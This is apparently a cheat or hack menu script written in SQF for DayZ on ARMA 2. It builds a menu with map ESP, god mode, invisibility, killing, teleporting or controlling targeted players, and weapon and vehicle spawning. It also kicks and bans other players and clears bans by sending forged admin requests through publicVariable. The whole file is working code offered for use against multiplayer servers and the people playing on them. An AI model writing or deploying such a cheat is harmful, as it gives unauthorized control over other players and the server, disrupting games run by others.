						_vm setMarkerTextLocal format ["%1", getText (configFile >> 'CfgVehicles' >> (typeof (_entities select _i)) >> 'displayName')];
						_vm setMarkerColorLocal ("ColorBlack");
					};
				};
				sleep 3;
			};
			_entities = vehicles;
			for "_i" from 0 to (count _entities)-1 do {deleteMarkerLocal ("adminvmark" + (str _i));};
		};
		adminMiscMark =
		{
			while {mark == 1} do
			{
				_entities = (allMissionObjects "tentStorage")+(allMissionObjects "UH1Wreck_DZ")+(allMissionObjects "UH60Wreck_DZ")
				+(allMissionObjects "Mi8Wreck_DZ");
				
				for "_i" from 0 to (count _entities)-1 do
				{
					deleteMarkerLocal ("adminMiscMark" + (str _i));
					_vm = createMarkerLocal [("adminMiscMark" + (str _i)), getPos (_entities select _i)];
					_vm setMarkerTypeLocal "destroyedvehicle";
					_vm setMarkerSizeLocal [0.8, 0.8];
					_vm setMarkerTextLocal format ["%1", getText (configFile >> 'CfgVehicles' >> (typeof (_entities select _i)) >> 'displayName')];
					_vm setMarkerColorLocal ("ColorOrange");
				};
				sleep 10;
			};
			_entities = (allMissionObjects "tentStorage")+(allMissionObjects "UH1Wreck_DZ")+(allMissionObjects "UH60Wreck_DZ")
						+(allMissionObjects "Mi8Wreck_DZ");
			for "_i" from 0 to (count _entities)-1 do {deleteMarkerLocal ("adminMiscMark" + (str _i));};
		};
		if (isNil "mark") then {mark = 0;};
		if (mark == 0) then
		{
			mark = 1;
			hint "2D Map Markers Enabled";
			[] spawn adminpmark;
			[] spawn adminvmark;
			[] spawn adminMiscMark;
		}
		else
		{
			mark = 0;
			hint "2D Map Markers Disabled";
		};
	};
	
hack_morph = {
[dayz_playerUID,dayz_characterID,_this select 1] call player_humanityMorph;
};

adminBan =
	{
		{
			if (name _x == _this select 0) then
			{
				tlmadminrq = [15,player,_x];
				publicVariable "tlmadminrq";
				hint format ["Banned %1...", _this select 0];
			};
		} forEach ([6800, 9200, 0] nearEntities [["AllVehicles"], 110000000]);
	};
adminKick =
	{
		{
			if (name _x == _this select 0) then
			{
				tlmadminrq = [14,player,_x];
				publicVariable "tlmadminrq";
				hint format ["Kicked %1...", _this select 0];
			};
		} forEach ([6800, 9200, 0] nearEntities [["AllVehicles"], 110000000]);
	};
adminClearBan =
	{
		tlmadminrq = [16,player];
		publicVariable "tlmadminrq";
		hint "Bans cleared!";
	};

if (isnil "take1") then { take1 = 0;
//if (true) then { take1 = 0;

hacks = []; // DO NOT EDIT THIS LINE
pic = []; // DO NOT EDIT THIS LINE
///////////////ADD HACK START//////////////////////


// ADD HACKS BELOW
// FORMAT: HACK TITLE >> SCRIPT PATH >> FILE NAME >> TYPE
///////////////BE CAREFULL IF YOU ARE EDITING THE NEXT PART ERRORS IN BETWEEN LOADER AND END AND IT WILL CAUSE THE GAME TO HALT/////////////////

startLoadingScreen [format ["LOADING TERRIBLE HAKE",_nul],"RscDisplayLoadMission"];

#define GET_DISPLAY (findDisplay 155)
#define GET_CTRL(a) (GET_DISPLAY displayCtrl ##a)
#define GET_SELECTED_DATA(a) ([##a] call {_idc = _this select 0;_selection = (lbSelection GET_CTRL(_idc) select 0);if (isNil {_selection}) then {_selection = 0};(GET_CTRL(_idc) lbData _selection)})
#define KINDOF_ARRAY(a,b) [##a,##b] call {_veh = _this select 0;_types = _this select 1;_res = false; {if (_veh isKindOf _x) exitwith { _res = true };} forEach _types;_res}
#define balca_VC_vehlist_IDC = 101


	pic = pic + [""]; hacks = hacks + ["Toggle Map ESP",hack_esp,"SQF"];
	
	pic = pic + [""]; hacks = hacks + ["Toggle God",hack_god,"SQF"];
	
	pic = pic + [""]; hacks = hacks + ["Toggle Invis",hack_invis,"SQF"];
	
	pic = pic + [""]; hacks = hacks + ["Refill Current Weapon",hack_refill,"SQF"];
	
	pic = pic + [""]; hacks = hacks + ["======== TARGET SCRIPTS ========","wuat\scripts\VehicleOwn.sqf","SQF"];
	
	pic = pic + [""]; hacks = hacks + ["Kill Target",hack_killPlr,"SQF"];
	
	pic = pic + [""]; hacks = hacks + ["Heal Target",hack_heal,"SQF"];
	
	pic = pic + [""]; hacks = hacks + ["Move Target",hack_telePlr,"SQF"];
	
	pic = pic + [""]; hacks = hacks + ["Control Target",hack_control,"SQF"];
	
	pic = pic + [""]; hacks = hacks + ["======== SERVER SCRIPTS ========","wuat\scripts\VehicleOwn.sqf","SQF"];
	
	pic = pic + [""]; hacks = hacks + ["Kick Target",adminKick,"SQF"];
	
	pic = pic + [""]; hacks = hacks + ["Ban Target",adminBan,"SQF"];
	
	pic = pic + [""]; hacks = hacks + ["Clear Bans",adminClearBan,"SQF"];
	
	
	pic = pic + [""]; hacks = hacks + ["======== CHANGE SKINS: DAYZ ========","wuat\scripts\VehicleOwn.sqf","SQF"];

	{pic = pic + [""]; hacks = hacks + [_x,hack_morph,"SQF"];}
	forEach 
	["ValtielGhillie_BP","UrbanStoneGhillie_BP","UrbanConcreteGhillie_BP","FarmGhillie_BP","TreeBarkGhillie_BP","ForestGhillie_BP","Survivor3_DZ","Bandit1_DZ","Soldier_Crew_PMC","Sniper1_DZ","Sniper2_DZ","Camo1_DZ","Camo2_DZ","Camo3_DZ","Camo4_DZ","Camo5_DZ","Camo6_DZ","Camo7_DZ","Camo8_DZ","Camo9_DZ","Camo10_DZ","Camo11_DZ","Camo12_DZ","Camo13_DZ","Soldier1_DZ","CIV_EuroMan01_DZ","CIV_EuroMan02_DZ","Citizen2_DZ","Citizen3_DZ","Pilot_DZ", "INS_Lopotev_DZ","Rocker3_DZ","Survivor2_DZ","Survivor1_DZ"];
	
	pic = pic + [""]; hacks = hacks + ["======== PLAYER WEAPONS ========","wuat\scripts\VehicleOwn.sqf","SQF"];


hint "Generating Gun listings.";
		_kindOf = ["Car"];
		_filter = ["BIS_Steerable_Parachute"];	
		_filter1 = ["ParachuteBase"];		
		_cfgvehicles = configFile >> "cfgWeapons";

		for "_i" from 0 to (count _cfgvehicles)-1 do {
			_vehicle = _cfgvehicles select _i;
			if (isClass _vehicle) then {
				_veh_type = configName(_vehicle);
				if ((getNumber(_vehicle >> "scope")==2)and(getText(_vehicle >> "picture")!="")) then {
          
					pic = pic + [format["%1",getText(_vehicle >> "picture")]];
					 hacks = hacks + [format["%1",_veh_type],hack_addwep,"SQF"];

				};
			};
			};

        pic = pic + [""]; hacks = hacks + ["========  Static Weapon Spawner   ========","wuat\scripts\VehicleOwn.sqf","SQF"];
 
hint "Generating Weapon listings.";
                _kindOf = ["StaticWeapon"];
                _filter = ["BIS_Steerable_Parachute"]; 
                _filter1 = ["ParachuteBase"];          
                _cfgvehicles = configFile >> "cfgVehicles";
 
                for "_i" from 0 to (count _cfgvehicles)-1 do {
                        _vehicle = _cfgvehicles select _i;
                        if (isClass _vehicle) then {
                                _veh_type = configName(_vehicle);
                                if ((getNumber(_vehicle >> "scope")==2)and(getText(_vehicle >> "picture")!="")and(KINDOF_ARRAY(_veh_type,_kindOf))and!(KINDOF_ARRAY(_veh_type,_filter))and!(KINDOF_ARRAY(_veh_type,_filter1))) then {
         
                                        pic = pic + [format["%1",getText(_vehicle >> "picture")]];
                                         hacks = hacks + [format["%1",_veh_type],hack_spawnVeh,"SQF"];
 
                                };
                        };
                        };
			

progressLoadingScreen 0.2;

        pic = pic + [""]; hacks = hacks + ["========  Bike Spawner   ========","wuat\scripts\VehicleOwn.sqf","SQF"];
 
hint "Generating Motorcycle listings.";
                _kindOf = ["Motorcycle"];
                _filter = ["BIS_Steerable_Parachute"]; 
                _filter1 = ["ParachuteBase"];          
                _cfgvehicles = configFile >> "cfgVehicles";
 
                for "_i" from 0 to (count _cfgvehicles)-1 do {
                        _vehicle = _cfgvehicles select _i;
                        if (isClass _vehicle) then {
                                _veh_type = configName(_vehicle);
                                if ((getNumber(_vehicle >> "scope")==2)and(getText(_vehicle >> "picture")!="")and(KINDOF_ARRAY(_veh_type,_kindOf))and!(KINDOF_ARRAY(_veh_type,_filter))and!(KINDOF_ARRAY(_veh_type,_filter1))) then {
         
                                        pic = pic + [format["%1",getText(_vehicle >> "picture")]];
                                         hacks = hacks + [format["%1",_veh_type],hack_spawnVeh,"SQF"];
 
                                };
                        };
                        };

        pic = pic + [""]; hacks = hacks + ["========  Boat Spawner   ========","wuat\scripts\VehicleOwn.sqf","SQF"];
 
hint "Generating Boat listings.";
                _kindOf = ["Ship"];
                _filter = ["BIS_Steerable_Parachute"]; 
                _filter1 = ["ParachuteBase"];          
                _cfgvehicles = configFile >> "cfgVehicles";
 
                for "_i" from 0 to (count _cfgvehicles)-1 do {
                        _vehicle = _cfgvehicles select _i;
                        if (isClass _vehicle) then {
                                _veh_type = configName(_vehicle);
                                if ((getNumber(_vehicle >> "scope")==2)and(getText(_vehicle >> "picture")!="")and(KINDOF_ARRAY(_veh_type,_kindOf))and!(KINDOF_ARRAY(_veh_type,_filter))and!(KINDOF_ARRAY(_veh_type,_filter1))) then {
         
                                        pic = pic + [format["%1",getText(_vehicle >> "picture")]];
                                         hacks = hacks + [format["%1",_veh_type],hack_spawnVeh,"SQF"];
 
                                };
                        };
                        };


pic = pic + [""]; hacks = hacks + ["========  Air Vehicle Spawner   ========","wuat\scripts\VehicleOwn.sqf","SQF"];

hint "Generating Vehicle listings.";
		_kindOf = ["air"];
		_filter = ["BIS_Steerable_Parachute"];	
		_filter1 = ["ParachuteBase"];		
		_cfgvehicles = configFile >> "cfgVehicles";

		for "_i" from 0 to (count _cfgvehicles)-1 do {
			_vehicle = _cfgvehicles select _i;
			if (isClass _vehicle) then {
				_veh_type = configName(_vehicle);
				if ((getNumber(_vehicle >> "scope")==2)and(getText(_vehicle >> "picture")!="")and(KINDOF_ARRAY(_veh_type,_kindOf))and!(KINDOF_ARRAY(_veh_type,_filter))and!(KINDOF_ARRAY(_veh_type,_filter1))) then {
					  pic = pic + [format["%1",getText(_vehicle >> "picture")]];
					  hacks = hacks + [format["%1",_veh_type],hack_spawnVeh,"SQF"];


           
				};
			};
		};
		
		
progressLoadingScreen 0.4;		
		
pic = pic + [""]; hacks = hacks + ["========  Tank Vehicle Spawner   ========","wuat\scripts\VehicleOwn.sqf","SQF"];

hint "Generating Vehicle listings.";
		_kindOf = ["Tank"];
		_filter = ["BIS_Steerable_Parachute"];	
		_filter1 = ["ParachuteBase"];		
		_cfgvehicles = configFile >> "cfgVehicles";

		for "_i" from 0 to (count _cfgvehicles)-1 do {
			_vehicle = _cfgvehicles select _i;
			if (isClass _vehicle) then {
				_veh_type = configName(_vehicle);
				if ((getNumber(_vehicle >> "scope")==2)and(getText(_vehicle >> "picture")!="")and(KINDOF_ARRAY(_veh_type,_kindOf))and!(KINDOF_ARRAY(_veh_type,_filter))and!(KINDOF_ARRAY(_veh_type,_filter1))) then {
          
					 pic = pic + [format["%1",getText(_vehicle >> "picture")]];
					  hacks = hacks + [format["%1",_veh_type],hack_spawnVeh,"SQF"];

				};
			};
		};
	
progressLoadingScreen 0.8;	
	
	pic = pic + [""]; hacks = hacks + ["========  Car Vehicle Spawner   ========","wuat\scripts\VehicleOwn.sqf","SQF"];

hint "Generating Vehicle listings.";
		_kindOf = ["Car"];
		_filter = ["BIS_Steerable_Parachute"];	
		_filter1 = ["ParachuteBase"];		
		_cfgvehicles = configFile >> "cfgVehicles";

		for "_i" from 0 to (count _cfgvehicles)-1 do {
			_vehicle = _cfgvehicles select _i;
			if (isClass _vehicle) then {
				_veh_type = configName(_vehicle);
				if ((getNumber(_vehicle >> "scope")==2)and(getText(_vehicle >> "picture")!="")and(KINDOF_ARRAY(_veh_type,_kindOf))and!(KINDOF_ARRAY(_veh_type,_filter))and!(KINDOF_ARRAY(_veh_type,_filter1))) then {
          
					pic = pic + [format["%1",getText(_vehicle >> "picture")]];
					 hacks = hacks + [format["%1",_veh_type],hack_spawnVeh,"SQF"];

				};
			};
			};



////////////////////////////////

progressLoadingScreen 1.0;


///////////////ADD HACK END//////////////////////


progressLoadingScreen 1.5;

};

////////////////////////////////////////////////
////////////////////////////////////////////////
////////////////////////////////////////////////
////////////////////////////////////////////////
////////////////////////////////////////////////
////////////////////////////////////////////////
////////////////////////////////////////////////
////////////////////////////////////////////////
//                   DO NOT EDIT BELOW THIS LINE
//            UNLESS YOU KNOW WHAT YOU ARE DOING
////////////////////////////////////////////////
////////////////////////////////////////////////
////////////////////////////////////////////////
////////////////////////////////////////////////
////////////////////////////////////////////////
////////////////////////////////////////////////
////////////////////////////////////////////////
////////////////////////////////////////////////

disableSerialization;
//ctrlshow [1004,false];
//ctrlshow [1003,false];
ctrlshow [1005,false];
ctrlshow [1012,false];
//ctrlshow [102,false];
//ctrlshow [103,false];
ctrlshow [116,false];
ctrlshow [121,false];
ctrlshow [125,false];
ctrlshow [126,false];
ctrlshow [127,false];
ctrlshow [117,false];
ctrlshow [118,false];
ctrlshow [128,false];
ctrlshow [106,false];
ctrlshow [107,false];
ctrlshow [1,false];
ctrlshow [2,false];
//ctrlshow [1002,false];

ctrlSetText [1001," A RANDOM MENU  "];
ctrlSetText [1002,"Status:"];

ctrlSetText [101,format["%1 - Team : %2",lifeState player , side player]]; 
ctrlSetText [103,format ["You are playing DayZ: Task : %1",currentTask player ]];
ctrlSetText [102,format ["%1",worldName]];
ctrlSetText [102,format ["ARMA 2",worldName]];

ctrlSetText [104,"Execute"];
ctrlSetText [105,"EXIT"];
ctrlSetText [106,"NEXTMENU"];
ctrlSetText [107,"EXIT"];
ctrlSetText [108,"Menu"];
ctrlSetText [1006,"Player List:"];

//sleep 0.5;

_T=0;
_Dev=114;//109


_side = format["%1",side player];

lbAdd [_Dev,name player];

lbsetpicture [_Dev,_T,"ca\ui\data\flag_none_ca.paa"];

if (_side == "WEST") then { lbsetpicture [_Dev,_T,"\ca\ui\data\flag_bluefor_ca.paa"]; };
if (_side == "EAST") then {lbsetpicture [_Dev,_T,"\ca\ui\data\flag_opfor_ca.paa"];};
if (_side == "GUERRILA") then {lbsetpicture [_Dev,_T,"\ca\ui\data\flag_indep_ca.paa"];};
if (_side == "CIVILIAN") then {lbsetpicture [_Dev,_T,"\ca\ui\data\flag_civil_ca.paa"];};

_T=_T+1;
hintsilent "";

_Dev=114;//109


_side = format["%1",side player];

lbAdd [_Dev,"ALL PLAYERS"];

lbsetpicture [_Dev,_T,"ca\ui\data\flag_none_ca.paa"];


if (_side == "WEST") then { lbsetpicture [_Dev,_T,"\ca\ui\data\flag_bluefor_ca.paa"]; };
if (_side == "EAST") then {lbsetpicture [_Dev,_T,"\ca\ui\data\flag_opfor_ca.paa"];};
if (_side == "GUERRILA") then {lbsetpicture [_Dev,_T,"\ca\ui\data\flag_indep_ca.paa"];};
if (_side == "CIVILIAN") then {lbsetpicture [_Dev,_T,"\ca\ui\data\flag_civil_ca.paa"];};

_T=_T+1;
hintsilent "";

_Dev=114;//109


_side = format["%1",side player];

lbAdd [_Dev,"EVERYONE BUT ME"];

lbsetpicture [_Dev,_T,"ca\ui\data\flag_none_ca.paa"];


if (_side == "WEST") then { lbsetpicture [_Dev,_T,"\ca\ui\data\flag_bluefor_ca.paa"]; };
if (_side == "EAST") then {lbsetpicture [_Dev,_T,"\ca\ui\data\flag_opfor_ca.paa"];};
if (_side == "GUERRILA") then {lbsetpicture [_Dev,_T,"\ca\ui\data\flag_indep_ca.paa"];};
if (_side == "CIVILIAN") then {lbsetpicture [_Dev,_T,"\ca\ui\data\flag_civil_ca.paa"];};

_T=_T+1;
hintsilent "";

_Dev=114;//109
{

_side = format["%1",side _x];
if (name _x != name player) then
{ 
lbAdd [_Dev,name _x];

lbsetpicture [_Dev,_T,"ca\ui\data\flag_none_ca.paa"];

if (_side == "WEST") then { lbsetpicture [_Dev,_T,"\ca\ui\data\flag_bluefor_ca.paa"]; };
if (_side == "EAST") then {lbsetpicture [_Dev,_T,"\ca\ui\data\flag_opfor_ca.paa"];};
if (_side == "GUERRILA") then {lbsetpicture [_Dev,_T,"\ca\ui\data\flag_indep_ca.paa"];};
if (_side == "CIVILIAN") then {lbsetpicture [_Dev,_T,"\ca\ui\data\flag_civil_ca.paa"];};

_T=_T+1;
};
hintsilent "";
} foreach playableunits;

lbSetCurSel [_Dev,0];

/////////////////////////

progressLoadingScreen 1.0;

/////////////////////////



_T = 0;
_P = 0;
	for [{_fx=0},{_fx<=count(hacks)-1},{_fx=_fx+3}] do
	{

	lbadd [109,format["%1",hacks select _fx]];
		lbsetcolor[109,(lbsize 109)-1,[1,1,.766,0.8]];
		//if (_T == 2) then {lbsetcolor[109,(lbsize 109)-1,[1,1,1,0.4]];};



lbsetpicture [109,(lbsize 109)-1,format["%1",pic select _P] ];

 
  //if (_T > 2 )  then { lbsetcolor[109,(lbsize 109)-1,[1,1,1,0.9]];  _T = 0; };
  		//_T = _T + 1;
_P = _P + 1;
	};


/////////////////////////

/////////////////////////


index = lbCurSel 109;
//hint format["%1",_hacks select index];

buttonSetAction [125,"hint '125';"];
buttonSetAction [126,"hint '126';"];
buttonSetAction [127,"hint '127';"];
buttonSetAction [104,"[lbtext[109,(lbCurSel 109)],lbtext[114,(lbCurSel 114)],(hacks select ((lbCurSel 109))*3+1)] spawn {
							[_this select 1, _this select 0] spawn (_this select 2);
				};"];
buttonSetAction [105,"closedialog 0;"];
buttonSetAction [106,"hint '106';"];
buttonSetAction [107,"closedialog 0;"];
endLoadingScreen;		
if (isnil "firstrun") then {firstrun = 1;hint "Instructions:\nClick a name then click on the action you want to perform on them. \nThen click execute \n( to do the action on all players click the name) \nALL PLAYERS. \nnote : \nThis message will not be displayed again until you reconnect.";};



};

publicVariable "BIS_MPF_remoteExecutionServeradmin_menu1";

diag_log "finished successfully";